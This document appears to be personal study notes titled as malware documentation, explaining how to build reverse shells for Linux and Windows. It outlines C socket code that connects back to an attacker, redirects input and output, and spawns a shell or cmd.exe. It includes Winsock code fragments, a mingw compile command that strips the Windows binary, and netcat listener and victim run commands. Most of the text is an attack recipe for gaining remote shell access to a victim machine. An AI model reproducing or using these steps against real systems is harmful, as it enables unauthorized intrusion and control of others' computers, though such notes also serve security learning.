A Documentation of Malware 
_______________________________________________________________________________
############################## Reverse Shells #################################
Connect to the attacker from the target machine

##### Linux Target Machine - reverse-shell-linux.c
  * Create a struct sockaddr_in (socket addr for IPv4) 
  * Set the struct sockaddr_in fields of family, port, and ip addr
  * Create a socket that connects with TCp
  * Connect to the attacker using the socket and sockaddr
  * Redirect the stdout, stdin, stderr fd to the socket fd
  * Execute a shell 

  Victim's Machine
    * ./a.out &

  Attacker's Machine
    * nc -lnvp <port>

##### Windows
  * Utilize Winsock (windows) header
    - #include <winsock2.h>
    - #pragma comment(lib, "ws2_32.lib") link programs with the ws2_32 lib
  * Initialize WINSOCK  
    - WSADATA socketData;
    - WSAStartup(MAKEWORD(2,2), &socketData);  // set winsock version to 2.2
  * Create a socket
    - SOCKET mainSocket;
    - mainSocket = WSASOCKET(...);
    - fill in sockaddr_in 
  * Establish connection
    - WSACONNECT();
  * Redirect handles to the attacker
    - STARTUPINFO s;
    - s.hStdInput ... = (HANDLE) mainSocket;
  * Create a process of a new shell
    - CreateProcess(NULL, "cmd.exe", ...);

  * To compile to PE file on linux:
    i686-w64-mingw32-g++ hack3.c -o hack3.exe -lws2_32 -s -ffunction-sections 
    -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants 
    -static-libstdc++ -static-libgcc -fpermissive

  Victim's Machine
    * /.reverse-shell-windows.exe
  
  Attacker's Machine
    * nc -lnvp <port>
_______________________________________________________________________________


